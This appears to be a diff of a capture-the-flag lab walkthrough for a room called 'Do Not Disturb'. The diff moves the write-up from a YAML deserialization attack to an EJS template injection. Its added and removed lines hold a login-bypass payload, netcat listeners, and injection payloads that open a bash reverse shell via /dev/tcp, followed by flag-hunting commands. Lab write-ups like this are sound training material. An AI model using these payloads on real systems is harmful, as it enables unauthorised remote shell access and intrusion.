@@ -5,7 +5,7 @@
 
 # Do Not Disturb
 
-In this room, the objective is to exploit a YAML injection vulnerability to gain initial access, establish a reverse shell, and complete the challenge by reaching the target Flags.
+In this room, the objective is to exploit an EJS injection vulnerability to gain initial access, establish a reverse shell, and complete the challenge by reaching the target Flags.
 
 Target application:
 ```
@@ -19,64 +19,80 @@ Goal:
 
 ## STEP 01
 
-- Check the source code for a hint:
+- Start with the SSI (Server Side Injection)
+- Open the developer option `F12`
+- Navigate to the `Network Tab`
+- Enable `cache`
+- Then check Header info
+  ```bash
+  curl -I http://<MACHINE_IP>
   ```
-  The source code contains a comment about login info
+  IMPORTANT
+  ```text
+  Web server: Express (Node.js)
+  Endpoint: POST /login
   ```
+  > According to this, we can see the application is likely a Node.js web application using the Express.js framework.
+
+- Check available routes
+  ```bash
+  gobuster dir -u http://10.48.151.238 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+  ```
+  output:
+  ```
+  /login
+  /staff
+  ```
+- Try fake login
+  ```
+  username: admin
+  password: 1234
+  ```
+- Then go to the `Network Tab`
+- Select the request,
+- Right-click and `Edit and resend.`
+- Then add the Express js Payload
+  ```
+  username=attendant&password[$ne]=x
+  ```
+-  Resend the request
+-  Check the request for `Set-cookie`
+-  Then copy the `Content-ID` and `value` separately
+- Go to the staff page tab
+- Select the `Storage` Tab
+- Select `cookies` and `Create New cookie`
+- Paste the `Content ID` and `value`
+- Refresh
 - Then log in to the app
 
 
 ## STEP 02
-- Find your `eth0` IP address
-- Open a netcat listener in the terminal
-  ```bash
-  nc -nvlp 2569
+- Now the EJS Injection part
+- Open a new terminal and start `NC listener`
   ```
-- Then run the YAML payload
-  ```bash
-  !!python/object/apply:os.system
-  - 'bash -c "bash -i >& /dev/tcp/<YOURIP/2569 0>&1"'
+  nc -nvlp 2500
   ```
-- Now you have access to root
-- Check what type of user you are
-  ```bash
+- Use this EJS payload
+  ```
+  <pre><%= process.getBuiltinModule('child_process').execSync('bash -c "bash -i >& /dev/tcp/<YOURMACHINEIP>/2500 0>&1"').toString() %></pre>
+  ```
+- This will open a reverse shell for you from root.
+- Then check privileges
+  ```
   whoami
   ```
-
-## STEP 03
-- Find the user flag
-  ```bash
+- Then search for `user.txt`
+  ```
   find / -name "user.txt" 2>/dev/null
   ```
-- Go to the file path
-- Open it
-  ```bash
+- Go to the folder and open it
+  ```
   cat user.txt
   ```
+- you found the user flag
 
-## STEP 04
-- Find the process that belongs to `root.txt`
-  ```bash
-  ps aux | grep root.txt
-  ```
-
-  > `ps aux` Linux command that displays information about **all currently running processes**. <br>
-  > What each part means
-    > - ps – Shows information about running processes.
-    > - a – Displays processes for all users.
-    > - u – Shows the processes in a user-oriented format, including the owner, CPU usage, and memory usage.
-    > - x – Includes processes without a controlling terminal, such as background services (daemons).
-    > - | - The pipe sends the output of ps aux to the next command.
-    > - grep - Searches for matching text
-  
-- Now you will find two processes, and one process contains the password for root
-- Let's access root
-  ```bash
-  su root
-  ```
-  > substitute user (or switch user). It allows you to change from your current user account to another user, most commonly the root user.
-- Use the `password` you have found
-- Then check for the `root.txt`
+## STEP 03
+- 
 
 ## You have found the  **TWO FLAGs** 🚩
 
